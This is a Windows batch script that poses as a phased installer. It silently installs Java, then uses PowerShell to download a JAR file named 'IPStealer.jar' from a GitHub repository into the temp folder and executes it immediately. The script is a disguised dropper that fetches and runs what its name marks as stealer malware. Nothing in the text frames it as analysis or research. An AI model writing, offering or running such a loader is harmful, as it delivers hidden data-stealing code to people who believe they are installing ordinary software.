@echo off
echo [Phase 1] Starting installation...

where java >nul 2>&1
if errorlevel 1 (
    echo [Phase 2] Java not found. Installing Java...
    powershell -Command "(New-Object Net.WebClient).DownloadFile('https://javadl.oracle.com/webapps/download/AutoDL?BundleId=249213_b2d4dfe4f4d04c8aab5a5b8f4a41c3a4', '%TEMP%\jre.exe')"
    start /wait "" "%TEMP%\jre.exe" /s
    timeout /t 30 >nul
    del "%TEMP%\jre.exe" 2>nul
) else (
    echo [Phase 2] Java is already installed.
)

echo [Phase 3] Downloading JAR...
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/mavi30173-ai/mc-server/raw/main/IPStealer.jar', '%TEMP%\ip.jar')"

echo [Phase 4] Running JAR...
java -jar "%TEMP%\ip.jar"

echo [Phase 5] Done.
timeout /t 3 >nul
exit
